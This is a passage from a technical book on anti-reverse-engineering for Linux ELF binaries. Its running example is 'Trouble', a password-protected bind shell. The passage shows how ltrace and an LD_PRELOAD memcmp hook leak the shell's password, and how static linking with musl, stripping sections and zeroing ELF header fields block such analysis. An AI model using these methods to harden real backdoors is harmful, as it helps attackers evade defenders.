= ((r11 ^ r10) + (*(int32_t *)(rbp + r8 * 0x4) ^\n\nr15) ^ (r15 >> 0x5 ^ r10 << 0x2) + (r10 >> 0x3 ^\nr15 << 0x4)) + *(int32_t *)r9;\n*(int32_t *)r9 = rax;\n} while (rdx < r12);\n}\n}\nr13 = r12;\nr10 = *(int32_t *)stack[2042];\n}\n**else {**\nr10 = rax;\nr13 = 0x0;\n}\nr15 = *(int32_t *)rdi;\nr8 = rax >> 0x5;\nrsi = *(int32_t *)(rbp + ((rsi ^ r13) & 0x3) * 0x4);\nrsi = rsi ^ rax;\nrax = rax << 0x4;\n*(int32_t *)stack[2042] = (rsi + (r11 ^ r15) ^ (r15 >> 0x3 ^ rax) +\n\n(r8 ^ r15 * 0x4)) + r10;\n} while (r11 != var_-12);\n}\n**return rax;**\n}\n\n\n-----\n\n###### Chapter 2: Compiler Options 52\n\n##### Consider what you’ve done to the reverse engineer that needs to understand btea_- encrypt(). Using “-O3 -funroll-loops” has nearly doubled the size of the function. Also, there are more loops and more branching than the original version. Simply by using the optimization flags available you’ve increased the work a reverse engineer will have to do to fully understand this function.\n\n### -static\n\n##### In the previous sections, you learned a number of ways to easily extract the contents of s_password to gain access to Trouble. However, you’ve also learned how to use the compiler options to defeat these s_password extraction techniques. In this section, you’ll learn about one last flag to hide s_password from prying eyes.\n\n#### Resolving Functions at Runtime\n\n##### It’s important to understand that Trouble resolves external dependencies at runtime. Consider the remaining dynamic symbols that Trouble has.\n\n###### Trouble’s dynamic symbols\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf --dyn-syms\\\n\ntrouble\n\nSymbol table '.dynsym' contains 31 entries:\nNum: Value Size Type Bind Ndx Name\n0: 0000000000000000 0 NOTYPE LOCAL UND\n1: 0000000000000000 0 NOTYPE WEAK UND _ITM_deregisterTMCloneTab\n2: 0000000000000000 0 FUNC GLOBAL UND __stack_chk_fail@GLIBC_2.4 (2)\n3: 0000000000000000 0 FUNC GLOBAL UND dup2@GLIBC_2.2.5 (3)\n4: 0000000000000000 0 FUNC GLOBAL UND close@GLIBC_2.2.5 (3)\n5: 0000000000000000 0 FUNC GLOBAL UND read@GLIBC_2.2.5 (3)\n6: 0000000000000000 0 FUNC GLOBAL UND __libc_start_main@GLIBC_2.2.5 (3)\n7: 0000000000000000 0 FUNC GLOBAL UND memcmp@GLIBC_2.2.5 (3)\n8: 0000000000000000 0 FUNC GLOBAL UND execve@GLIBC_2.2.5 (3)\n9: 0000000000000000 0 NOTYPE WEAK UND __gmon_start__\n10: 0000000000000000 0 FUNC GLOBAL UND listen@GLIBC_2.2.5 (3)\n11: 0000000000000000 0 FUNC GLOBAL UND bind@GLIBC_2.2.5 (3)\n12: 0000000000000000 0 FUNC GLOBAL UND perror@GLIBC_2.2.5 (3)\n\n\n-----\n\n###### Chapter 2: Compiler Options 53\n\n13: 0000000000000000 0 NOTYPE WEAK UND _Jv_RegisterClasses\n14: 0000000000000000 0 FUNC GLOBAL UND accept@GLIBC_2.2.5 (3)\n15: 0000000000000000 0 FUNC GLOBAL UND fwrite@GLIBC_2.2.5 (3)\n16: 0000000000000000 0 NOTYPE WEAK UND _ITM_registerTMCloneTable\n17: 0000000000000000 0 FUNC GLOBAL UND fork@GLIBC_2.2.5 (3)\n18: 0000000000000000 0 FUNC GLOBAL UND socket@GLIBC_2.2.5 (3)\n19: 0000000000602098 0 NOTYPE GLOBAL 25 _edata\n20: 0000000000602088 0 NOTYPE GLOBAL 25 __data_start\n21: 00000000006020b0 0 NOTYPE GLOBAL 26 _end\n22: 0000000000602088 0 NOTYPE WEAK 25 data_start\n23: 0000000000400da0 4 OBJECT GLOBAL 16 _IO_stdin_used\n24: 0000000000400d20 101 FUNC GLOBAL 14 __libc_csu_init\n25: 0000000000400c00 42 FUNC GLOBAL 14 _start\n26: 0000000000602098 0 NOTYPE GLOBAL 26 __bss_start\n27: 0000000000400918 0 FUNC GLOBAL 11 _init\n28: 00000000006020a0 8 OBJECT GLOBAL 26 stderr@GLIBC_2.2.5 (3)\n29: 0000000000400d90 2 FUNC GLOBAL 14 __libc_csu_fini\n30: 0000000000400d94 0 FUNC GLOBAL 15 _fini\n\n##### Notice all of the GLOBAL FUNC symbols that are labeled as undefined (UND) and have a value of 0? These are functions whose implementations exist in external libraries that won’t be loaded until runtime. Another way to find the functions that need to be loaded is to look at the binary’s relocation information in readelf.\n\n###### Trouble’s relocations\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -r ./troub\\\nle\n\nRelocation section '.rela.dyn' at offset 0x798 contains 2 entries:\nOffset Type Sym. Value Sym. Name + Addend\n000000601ff8 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0\n0000006020a0 R_X86_64_COPY 00000000006020a0 stderr@GLIBC_2.2.5 + 0\n\nRelocation section '.rela.plt' at offset 0x7c8 contains 14 entries:\nOffset Type Sym. Value Sym. Name + Addend\n000000602018 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0\n000000602020 R_X86_64_JUMP_SLO 0000000000000000 dup2@GLIBC_2.2.5 + 0\n000000602028 R_X86_64_JUMP_SLO 0000000000000000 close@GLIBC_2.2.5 + 0\n000000602030 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0\n000000602038 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0\n\n\n-----\n\n###### Chapter 2: Compiler Options 54\n\n000000602040 R_X86_64_JUMP_SLO 0000000000000000 memcmp@GLIBC_2.2.5 + 0\n000000602048 R_X86_64_JUMP_SLO 0000000000000000 execve@GLIBC_2.2.5 + 0\n000000602050 R_X86_64_JUMP_SLO 0000000000000000 listen@GLIBC_2.2.5 + 0\n000000602058 R_X86_64_JUMP_SLO 0000000000000000 bind@GLIBC_2.2.5 + 0\n000000602060 R_X86_64_JUMP_SLO 0000000000000000 perror@GLIBC_2.2.5 + 0\n000000602068 R_X86_64_JUMP_SLO 0000000000000000 accept@GLIBC_2.2.5 + 0\n000000602070 R_X86_64_JUMP_SLO 0000000000000000 fwrite@GLIBC_2.2.5 + 0\n000000602078 R_X86_64_JUMP_SLO 0000000000000000 fork@GLIBC_2.2.5 + 0\n000000602080 R_X86_64_JUMP_SLO 0000000000000000 socket@GLIBC_2.2.5 + 0\n\n##### Look at memcmp(), one of the functions that needs to be loaded, in GDB before Trouble has been started and after it has been started.\n\n###### Examining memcmp() before libc.so is loaded\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb ./trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble...(no debugging symbols found)...done.\n(gdb) info address memcmp\nSymbol \"memcmp\" is at 0x4009a0 in a file compiled without debugging.\n(gdb) disas memcmp\nDump of assembler code for function memcmp@plt:\n0x00000000004009a0 <+0>: jmpq *0x20169a(%rip) # 0x602040\n0x00000000004009a6 <+6>: pushq $0x5\n0x00000000004009ab <+11>: jmpq 0x400940\n\n##### In the GDB output above, I’ve issued two commands info address memcmp and disas memcmp. Notice that the result of each of these commands points to an address in\n\n\n-----\n\n###### Chapter 2: Compiler Options 55\n\n##### the PLT (procedure linkage table): 0x4009a0. However, if you reissue the commands after Trouble has begun execution you’ll find that memcmp() now points into libc.so.\n\n###### Examining memcmp() after libc.so is loaded\n\n(gdb) info address memcmp\nSymbol \"memcmp\" is at 0x7ffff7a9c180 in a file compiled without debugging.\n(gdb) disas memcmp\nDump of assembler code for function memcmp:\n0x00007ffff7a9c180 <+0>: mov 0x334ce9(%rip),%rdx # 0x7ffff7dd0e70\n0x00007ffff7a9c187 <+7>: testl $0x200,0x80(%rdx)\n0x00007ffff7a9c191 <+17>: jne 0x7ffff7a9c19b <memcmp+27>\n0x00007ffff7a9c193 <+19>: lea 0x26(%rip),%rax # <__memcmp_sse2>\n0x00007ffff7a9c19a <+26>: retq\n0x00007ffff7a9c19b <+27>: testl $0x80000,0x80(%rdx)\n0x00007ffff7a9c1a5 <+37>: je 0x7ffff7a9c1af <memcmp+47>\n0x00007ffff7a9c1a7 <+39>: lea 0xdfab2(%rip),%rax # <__memcmp_sse4_1>\n0x00007ffff7a9c1ae <+46>: retq\n0x00007ffff7a9c1af <+47>: lea 0xe223a(%rip),%rax # <__memcmp_ssse3>\n0x00007ffff7a9c1b6 <+54>: retq\nEnd of assembler dump.\n\n##### libc.so has been loaded into memory and Trouble now points to the memcmp() implementation in the shared object.\n\n#### ltrace\n\n##### A reasonable person might believe that memcmp() might be used to compare the password provided by the user and the password embedded in Trouble. In fact, you can confirm this is the case by using a utility called ltrace.\n\n#### ltrace\n\n###### ltrace, or library tracer, is a utility that will display all of the dynamic library calls that occur while the program is running.\n\n\n-----\n\n###### Chapter 2: Compiler Options 56\n\n Using ltrace on Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ltrace -f ./troubl\\\ne\n\n[pid 21490] __libc_start_main(0x400c2f, 1, 0x7ffe19798d48, 0x400e60 <unfinished ...>\n\n[pid 21490] socket(2, 1, 6) = 3\n\n[pid 21490] htonl(0, 1, 6, 0x7f82e7aea9b7) = 0\n\n[pid 21490] htons(1270, 1, 6, 0x7f82e7aea9b7) = 0xf604\n\n[pid 21490] bind(3, 0x7ffe19798c20, 16, 0x7ffe19798c20) = 0\n\n[pid 21490] listen(3, 5, 16, 0x7f82e7aea507) = 0\n\n[pid 21490] accept(3, 0, 0, 0x7f82e7aea627) = 4\n\n[pid 21490] fork() = 21492\n\n[pid 21490] close(4 <unfinished ...>\n\n[pid 21492] <... fork resumed> ) = 0\n\n[pid 21490] <... close resumed> ) = 0\n\n[pid 21492] read(4 <unfinished ...>\n\n[pid 21490] accept(3, 0, 0, 0x7f82e7ad9d10 <unfinished ...>\n\n[pid 21492] <... read resumed>, \"looooooooooooooooooooooooooooool\"..., 33) = 33\n\n[pid 21492] memcmp(0x400f00, 0x7ffe19798c30, 32, 0x7f82e7ad9680) = 3\n\n[pid 21492] close(4) = 0\n\n[pid 21492] +++ exited (status 1) +++\n\n[pid 21490] --- SIGCHLD (Child exited) --\n##### Towards the end of this trace you can see a call to memcmp() and the first parameter is the very familiar address of 0x400f00 (aka s_password). ltrace is able to record these calls by using ptrace to insert breakpoints at the beginning of the loaded functions ²⁶. In later chapters, you’ll learn how to prevent programs that use ptrace to operate on Trouble. However, for this section just understand that library tracing is a real problem for Trouble.\n\n#### LD_PRELOAD\n\n##### I mentioned that library tracing via ptrace is something you learn to defeat in later chapters. However, there is another method for printing out the parameters to memcmp(). By using the dynamic linker’s LD_PRELOAD ²⁷ option, you can load your own library before the other shared objects, like libc.so, are loaded. That means\n\n###### ²⁶https://www.kernel.org/doc/ols/2007/ols2007v1-pages-41-52.pdf ²⁷man ld.so\n\n\n-----\n\n###### Chapter 2: Compiler Options 57\n\n##### that you can introduce your own code to handle memcmp() and your function will be executed instead of libc.so’s.\n\n I’ve written code to prove this out. It can be found in the chapter two directory under “ld_preload”. The directory contains two files: CMakeLists.txt and catch_memcmp.c.\n\n###### chap_2_compiler/ld_preload/CMakeLists.txt\n\nproject(catch_memcmp.so C)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -fPIC -shared -std=gnu11\")\nadd_executable(${PROJECT_NAME} src/catch_memcmp.c)\ntarget_link_libraries(${PROJECT_NAME} dl)\n\n###### chap_2_compiler/ld_predload/src/catch_memcmp.c\n\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <dlfcn.h>\n\n/**\n\n - This program, when used with LD_PRELOAD, will print the values passed into\n\n - memcmp and then pass the values to to the real memcmp. Usage:\n \n - LD_PRELOAD=./catch_memcmp.so ../../trouble/build/trouble\n*/\n**int memcmp(const void *s1, const void *s2, size_t n)**\n{\n\n**char* new_s1 = calloc(n + 1, 1);**\n**char* new_s2 = calloc(n + 1, 1);**\n\nmemcpy(new_s1, s1, n);\nmemcpy(new_s2, s2, n);\n\nprintf(\"memcmp(%s, %s, %u)\\n\", new_s1, new_s2, (int)n);\n\nfree(new_s1);\nfree(new_s2);\n\n\n-----\n\n###### Chapter 2: Compiler Options 58\n\n// pass the params to the real memcmp and return the result\n**int (*original_memcmp)(const void *s1, const void *s2, size_t n);**\noriginal_memcmp = dlsym(RTLD_NEXT, \"memcmp\");\n**return original_memcmp(s1, s2, n);**\n}\n\n##### In catch_memcmp.c, I’ve written my own implementation of memcmp(). In the code, I print out the passed in values. Then I load the real memcmp() function using dlsym() and finally execute the real “original” memcmp() so that Trouble still operates as expected.\n\n To compile this code use CMake.\n\n###### Compiling catch_memcmp.so\n\nalbino-lobster@ubuntu:~/antire_book$ cd chap_2_compiler/ld_preload/\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/ld_preload$ mkdir build\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/ld_preload$ cd build/\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/ld_preload/build$ cmake ..\n-- The C compiler identification is GNU 5.4.0\n-- Check for working C compiler: /usr/bin/cc\n-- Check for working C compiler: /usr/bin/cc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_2_compiler\\\n/ld_preload/build\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/ld_preload/build$ make\nScanning dependencies of target catch_memcmp.so\n\n[ 50%] Building C object CMakeFiles/catch_memcmp.so.dir/src/catch_memcmp.c.o\n\n[100%] Linking C executable catch_memcmp.so\n\n[100%] Built target catch_memcmp.so\n\n##### As you can see, this generates the shared object catch_memcmp.so. This is the shared object that you’ll pass to LD_PRELOAD when you execute Trouble. For example:\n\n\n-----\n\n###### Chapter 2: Compiler Options 59\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/ld_preload/build$ LD_PRELOAD=./ca\\\ntch_memcmp.so ../../trouble/build/trouble\n\n##### With Trouble running, attempt to connect to the bind shell on port 1270 with netcat. You should input a 32 byte string and hit enter. For example:\n\n###### Passing a bogus password to Trouble\n\nalbino-lobster@ubuntu:~$ nc 127.0.0.1 1270\nlooooooooooooooooooooooooooooool\nalbino-lobster@ubuntu:~$\n\n##### The netcat connection should immediately be terminated by Trouble because you provided a bad password. However, if you look back at the terminal you ran Trouble from you should see something like this:\n\n###### catch_memcmp.so reveals s_password\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/ld_preload/build$ LD_PRELOAD=./ca\\\ntch_memcmp.so ../../trouble/build/trouble\nmemcmp(TGOEu26TW0k1b9IeXjUJbT1GfCR0jSnl, looooooooooooooooooooooooooooool, 32)\n\n##### You can clearly see s_password and the bogus string I attempted to use in my netcat connection have been printed out by catch_memcmp.so.\n\n#### Using musl\n\n##### If you want to write a truly hardened binary it’s best to distrust all of the shared libraries on the system. This is where the -static flag finally comes into play. According to the GCC documentation, -static “prevents linking with the shared libraries”²⁸. However, glibc, the libc version shipped with many major Linux distros, is really not meant to be statically linked. When we do statically link it, some libc functionality gets broken and it makes our binary significantlly larger. The fact of the matter is that glibc simply should not be used for static linking. Luckily, there are other versions of libc that are intended to be statically linked²⁹:\n\n###### ²⁸https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html ²⁹http://www.etalabs.net/compare_libcs.html\n\n\n-----\n\n###### Chapter 2: Compiler Options 60\n\n##### 1. diet libc³⁰ 2. uClibc³¹ 3. musl libc³²\n\n For the remainder of this book we will be using musl (pronounced “muscle”) libc. I’ve chosen musl because it is actively maintained, its easy to install on Ubuntu, and it works well with CMake.\n\n To install musl on Ubuntu, use apt-get:\n\n###### Installing musl on Ubuntu 16.04\n\nalbino-lobster@ubuntu:~/antire_book$ sudo apt-get install musl-tools musl-dev\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\nmusl\nRecommended packages:\nlinux-musl-dev\nThe following NEW packages will be installed:\nmusl musl-dev musl-tools\n0 upgraded, 3 newly installed, 0 to remove and 45 not upgraded.\nNeed to get 0 B/780 kB of archives.\nAfter this operation, 3,568 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nSelecting previously unselected package musl:amd64.\n(Reading database ... 242454 files and directories currently installed.)\nPreparing to unpack .../musl_1.1.9-1_amd64.deb ...\nUnpacking musl:amd64 (1.1.9-1) ...\nSelecting previously unselected package musl-dev.\nPreparing to unpack .../musl-dev_1.1.9-1_amd64.deb ...\nUnpacking musl-dev (1.1.9-1) ...\nSelecting previously unselected package musl-tools.\nPreparing to unpack .../musl-tools_1.1.9-1_amd64.deb ...\nUnpacking musl-tools (1.1.9-1) ...\nProcessing triggers for man-db (2.7.5-1) ...\nSetting up musl:amd64 (1.1.9-1) ...\n\n###### ³⁰https://www.fefe.de/dietlibc/ ³¹https://uclibc.org/ ³²https://www.musl-libc.org/\n\n\n-----\n\n###### Chapter 2: Compiler Options 61\n\nSetting up musl-dev (1.1.9-1) ...\nSetting up musl-tools (1.1.9-1) ...\n\n##### To update Trouble to use the -static flag you just update the compiler flags.\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -s -fvisibility=hidden -O3 -funroll-loops -\\\nstatic -std=gnu11\")\n\n##### Also, you need to tell CMake to use a different compiler. Put the following line right above the CMAKE_C_FLAGS line:\n\nset(CMAKE_C_COMPILER musl-gcc)\n\n##### And that’s it! Now when you compile Trouble you’ll be using using musl libc instead of glibc.\n\n### Size matters\n\n###### I wanted to see the size difference between static linking with glibc and musl libc. I compiled Trouble using each library and the results are really telling:\n\n ls -l on the glibc version of Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ls -l ./trouble\n-rwxrwxr-x 1 albino-lobster albino-lobster 840632 Nov 3 17:32 trouble\n\n###### ls -l on the musl libc version of Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ls -l ./trouble\n-rwxrwxr-x 1 albino-lobster albino-lobster 9560 Nov 3 17:44 ./trouble\n\n###### There you have it. 840kb vs 9.5kb. A huge difference in size!\n\n##### You might be asking, how do I know I’m no longer using any dynamic libraries? One way is to check the needed shared library’s listed in the dynamic section. You can use readelf to this.\n\n\n-----\n\n###### Chapter 2: Compiler Options 62\n\n Trouble’s dynamic section when using glibc\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -d ./troub\\\nle\n\nDynamic section at offset 0x1e28 contains 24 entries:\nTag Type Name/Value\n0x0000000000000001 (NEEDED) Shared library: [libc.so.6]\n0x000000000000000c (INIT) 0x4009d0\n0x000000000000000d (FINI) 0x400ed4\n0x0000000000000019 (INIT_ARRAY) 0x601e10\n0x000000000000001b (INIT_ARRAYSZ) 8 (bytes)\n0x000000000000001a (FINI_ARRAY) 0x601e18\n0x000000000000001c (FINI_ARRAYSZ) 8 (bytes)\n0x000000006ffffef5 (GNU_HASH) 0x400298\n0x0000000000000005 (STRTAB) 0x400648\n0x0000000000000006 (SYMTAB) 0x400300\n0x000000000000000a (STRSZ) 350 (bytes)\n0x000000000000000b (SYMENT) 24 (bytes)\n0x0000000000000015 (DEBUG) 0x0\n0x0000000000000003 (PLTGOT) 0x602000\n0x0000000000000002 (PLTRELSZ) 384 (bytes)\n0x0000000000000014 (PLTREL) RELA\n0x0000000000000017 (JMPREL) 0x400850\n0x0000000000000007 (RELA) 0x400820\n0x0000000000000008 (RELASZ) 48 (bytes)\n0x0000000000000009 (RELAENT) 24 (bytes)\n0x000000006ffffffe (VERNEED) 0x4007f0\n0x000000006fffffff (VERNEEDNUM) 1\n0x000000006ffffff0 (VERSYM) 0x4007a6\n0x0000000000000000 (NULL) 0x0\n\n##### The first line says that the shared library “libc.so.6” is needed. However, after compiling with musl libc the dynamic section doesn’t even exist.\n\n\n-----\n\n###### Chapter 2: Compiler Options 63\n\n Trouble’s dynamic section when using musl libc\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -d ./troub\\\nle\n\nThere is no dynamic section in this file.\n\n##### Another way to look at a binary’s external dependencies is to use ldd.\n\n###### Using ldd on Trouble with glibc\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ldd ./trouble\nlinux-vdso.so.1 => (0x00007ffca230a000)\nlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2870c05000)\n/lib64/ld-linux-x86-64.so.2 (0x0000555b3d187000)\n\n###### Using ldd on Trouble with musl libc\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ldd ./trouble\nnot a dynamic executable\n\n##### You can see that Trouble had a few external dependencies before musl but after switching libc versions it doesn’t have any dynamic dependencies. We’ve stopped any pesky reverse engineer from using LD_PRELOAD or ltrace on Trouble!\n\n\n-----\n\n# Chapter 3: File Format Hacks\n\n##### This chapter is all about modifying the ELF data structures after compilation. Having some understanding of these data structures would be useful in understanding this chapter. However, I don’t think you have to know ELF in order to benefit from this chapter. You should pick up a good amount as we go.\n\n The main reason I’ve not written a primer on ELF for this book is because there are many good descriptions that already exist. If you’d like to brush up on ELF than check out these resources:\n\n 1. man elf 2. https://en.wikipedia.org/wiki/Executable_and_Linkable_Format 3. http://wiki.osdev.org/ELF\n\n### The Strip Utility\n\n##### In chapter two you used the strip compiler option, -s, to remove the .symtab from Trouble. There exists a post-compilation tool called “strip” that will do the same thing. However, the strip utility can do more than remove the symbol table. It can remove sections from a binary.\n\n What do I mean by “remove sections”? Take a look at the section headers table in chapter three’s version of Trouble:\n\n\n-----\n\n###### Chapter 3: File Format Hacks 65\n\n Trouble’s section headers table\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -S ./t\\\nrouble\nThere are 13 section headers, starting at offset 0x2218:\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 0] NULL 0000000000000000 00000000\n0000000000000000 0000000000000000 0 0 0\n\n[ 1] .init PROGBITS 0000000000400120 00000120\n0000000000000003 0000000000000000 AX 0 0 1\n\n[ 2] .text PROGBITS 0000000000400130 00000130\n000000000000126f 0000000000000000 AX 0 0 16\n\n[ 3] .fini PROGBITS 000000000040139f 0000139f\n0000000000000003 0000000000000000 AX 0 0 1\n\n[ 4] .rodata PROGBITS 00000000004013c0 000013c0\n0000000000000858 0000000000000000 A 0 0 64\n\n[ 5] .eh_frame PROGBITS 0000000000401c18 00001c18\n0000000000000004 0000000000000000 A 0 0 4\n\n[ 6] .init_array INIT_ARRAY 0000000000601fe8 00001fe8\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 7] .fini_array FINI_ARRAY 0000000000601ff0 00001ff0\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 8] .jcr PROGBITS 0000000000601ff8 00001ff8\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 9] .data PROGBITS 0000000000602000 00002000\n0000000000000160 0000000000000000 WA 0 0 64\n\n[10] .bss NOBITS 0000000000602180 00002160\n0000000000000320 0000000000000000 WA 0 0 64\n\n[11] .comment PROGBITS 0000000000000000 00002160\n0000000000000058 0000000000000001 MS 0 0 1\n\n[12] .shstrtab STRTAB 0000000000000000 000021b8\n0000000000000060 0000000000000000 0 0 1\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\n##### Notice the .comment section? That’s a really odd name for a section. Let’s examine its contents using objdump.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 66\n\n Contents of .comment\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ objdump -s --s\\\nection .comment ./trouble\n\n./trouble: file format elf64-x86-64\n\nContents of section .comment:\n\n0000 4743433a 20285562 756e7475 20352e34 GCC: (Ubuntu 5.4\n0010 2e302d36 7562756e 7475317e 31362e30 .0-6ubuntu1~16.0\n0020 342e3229 20352e34 2e302032 30313630 4.2) 5.4.0 20160\n0030 36303900 4743433a 20285562 756e7475 609.GCC: (Ubuntu\n0040 20342e39 2e322d31 37756275 6e747531 4.9.2-17ubuntu1\n0050 2920342e 392e3200 ) 4.9.2.\n\n##### Those look like some kind of version strings? To get a cleaner read you can use the strings utility.\n\n###### Using strings to get the .comment output\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ strings -a ./t\\\nrouble | grep GCC\nGCC: (Ubuntu 5.4.0-6ubuntu1~16.04.2) 5.4.0 20160609\nGCC: (Ubuntu 4.9.2-17ubuntu1) 4.9.2\n\n##### The first string is the version of GCC that’s on Ubuntu 16.04. Honestly, I’m not entirely certain what the second string is all about. Regardless! We don’t need or want this information in our binary. While the information isn’t going to aid a reverse engineer in pulling apart our binary it could help with various attribution techniques. So let’s just remove it. Strip can remove sections via the -R option.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 67\n\n Stripping .comment from Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -S ./t\\\nrouble\nThere are 12 section headers, starting at offset 0x21b8:\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 0] NULL 0000000000000000 00000000\n0000000000000000 0000000000000000 0 0 0\n\n[ 1] .init PROGBITS 0000000000400120 00000120\n0000000000000003 0000000000000000 AX 0 0 1\n\n[ 2] .text PROGBITS 0000000000400130 00000130\n000000000000126f 0000000000000000 AX 0 0 16\n\n[ 3] .fini PROGBITS 000000000040139f 0000139f\n0000000000000003 0000000000000000 AX 0 0 1\n\n[ 4] .rodata PROGBITS 00000000004013c0 000013c0\n0000000000000858 0000000000000000 A 0 0 64\n\n[ 5] .eh_frame PROGBITS 0000000000401c18 00001c18\n0000000000000004 0000000000000000 A 0 0 4\n\n[ 6] .init_array INIT_ARRAY 0000000000601fe8 00001fe8\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 7] .fini_array FINI_ARRAY 0000000000601ff0 00001ff0\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 8] .jcr PROGBITS 0000000000601ff8 00001ff8\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 9] .data PROGBITS 0000000000602000 00002000\n0000000000000160 0000000000000000 WA 0 0 64\n\n[10] .bss NOBITS 0000000000602180 00002160\n0000000000000320 0000000000000000 WA 0 0 64\n\n[11] .shstrtab STRTAB 0000000000000000 00002160\n0000000000000057 0000000000000000 0 0 1\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\n##### As you can see from the above, not only has .comment been removed from the section header table, but the next entry, .shstrtab, has been moved up to overwrite when .comment used to exist.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 68\n\n##### You don’t want to manually execute strip -R after every build though. That would just be sort of annoying. Luckily, CMake provides the ability to execute commands. If you add the following command to the end of Trouble’s CMakeList.txt than the .comment section will be removed everytime the binary is compiled:\n\n###### Strip .comment atfter each compilation\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND strip -R .comment ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NA\\\nME})\n\n### Removing the Section Headers Table\n\n##### In the previous section you were looking at the section headers table. The section headers table is useful for a reverse engineer because it breaks down the binary’s address space into very specific chunks. However, the section headers table isn’t actually needed for execution. You read that right, the section table is not needed! You can remove it entirely.\n\n Don’t take my word for it though. Test it yourself. Consider Trouble’s ELF header.\n\n###### Trouble’s ELF header\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -h ./t\\\nrouble\nELF Header:\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: EXEC (Executable file)\nMachine: Advanced Micro Devices X86-64\nVersion: 0x1\nEntry point address: 0x4002f2\nStart of program headers: 64 (bytes into file)\nStart of section headers: 8632 (bytes into file)\nFlags: 0x0\n\n\n-----\n\n###### Chapter 3: File Format Hacks 69\n\nSize of this header: 64 (bytes)\nSize of program headers: 56 (bytes)\nNumber of program headers: 4\nSize of section headers: 64 (bytes)\nNumber of section headers: 12\nSection header string table index: 11\n\n##### There are four variables from the ELF header that are used to find, parse, and display the section headers table:\n\n 1. Start of sections headers 2. Size of section headers 3. Number of section headers 4. Section header string table index\n\n If you zero out these values then locating or parsing the table would be impossible. Try opening Trouble in a hex editor (such as ghex) and zero out bytes 0x28, 0x29, 0x3a, 0x3c, and 0x3e. Afterwards Trouble’s ELF header should look like this:\n\n###### Updated ELF header\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -h ./t\\\nrouble\nELF Header:\nMagic: 7f 